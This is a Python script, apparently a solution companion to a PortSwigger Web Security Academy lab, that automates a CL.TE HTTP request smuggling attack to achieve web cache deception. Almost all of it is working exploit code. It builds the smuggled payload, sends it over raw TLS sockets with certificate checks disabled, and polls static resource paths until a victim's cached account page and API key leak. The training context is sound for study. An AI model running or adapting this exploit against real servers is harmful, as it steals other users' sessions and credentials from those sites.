#!/usr/bin/env python3
"""
Exploiting HTTP request smuggling to perform web cache deception
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 18-web-cache-deception-via-smuggling.md

What this does:
    Smuggles a deliberately incomplete "GET /my-account HTTP/1.1\\r\\nX-Ignore: X"
    prefix via CL.TE -- no terminating blank line, so the back-end keeps
    waiting for more headers and absorbs the next real user's request line
    straight into the X-Ignore value instead of starting a fresh request.
    If that next real request is a victim's browser requesting a static
    resource (carrying their session cookie automatically), the back-end
    ends up serving /my-account -- their account page, complete with their
    real API key -- and the front-end caches it under the URL the victim
    actually requested. This repeats the smuggle, then checks every static
    resource path on the site for the string "Your API Key" turning up
    where a plain CSS or JS file should be.

Usage:
    python 18-web-cache-deception-via-smuggling.py <lab-url>
    e.g. python 18-web-cache-deception-via-smuggling.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import socket
import ssl
import sys
import time
from urllib.parse import urlparse

import httpx


def create_ssl_connection(host: str, port: int = 443, timeout: float = 10.0) -> ssl.SSLSocket:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["http/1.1"])
    sock = socket.create_connection((host, port), timeout=timeout)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    return ctx.wrap_socket(sock, server_hostname=host)


def build_clte_payload(host: str, smuggled_request: str, path: str = "/",
                        method: str = "POST") -> bytes:
    body = "0\r\n\r\n" + smuggled_request
    headers = (
        f"{method} {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/x-www-form-urlencoded\r\n"
        f"Transfer-Encoding: chunked\r\n"
        f"Content-Length: {len(body)}\r\n"
        f"\r\n"
    )
    return (headers + body).encode()


def send_smuggle(host: str, port: int, attack: bytes) -> None:
    try:
        conn = create_ssl_connection(host, port)
        conn.sendall(attack)
        conn.settimeout(2)
        try:
            conn.recv(4096)
        except Exception:
            pass
        conn.close()
    except Exception:
        pass


def solve(lab_url: str) -> None:
    parsed = urlparse(lab_url)
    host = parsed.hostname
    port = 443 if parsed.scheme == "https" else 80

    # Incomplete smuggled request -- deliberately not terminated with \r\n\r\n,
    # so the follow-up request's own line gets absorbed into X-Ignore instead
    # of colliding on a duplicate Host header.
    smuggled = "GET /my-account HTTP/1.1\r\nX-Ignore: X"
    attack = build_clte_payload(host, smuggled)

    r = httpx.get(lab_url + "/", verify=False)
    static_paths = list(set(re.findall(r'(?:href|src)="(/resources/[^"]+)"', r.text)))
    print(f"[*] Watching {len(static_paths)} static resource paths for the leak.")

    for attempt in range(1, 21):
        for _ in range(3):
            send_smuggle(host, port, attack)
        time.sleep(0.5)

        for path in static_paths:
            resp = httpx.get(f"{lab_url}{path}", verify=False)
            if "Your API Key" in resp.text:
                print(f"[+] Leaked account page cached at: {path}")
                print(f"    {resp.text[:300]}")
                check = httpx.get(lab_url + "/", verify=False)
                print(f"[+] Solved: {'is-solved' in check.text}")
                return

        print(f"[*] Attempt {attempt}: no leak yet, re-smuggling and re-checking...")

    print("[-] Did not find the leaked account page within the attempt budget -- re-run.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
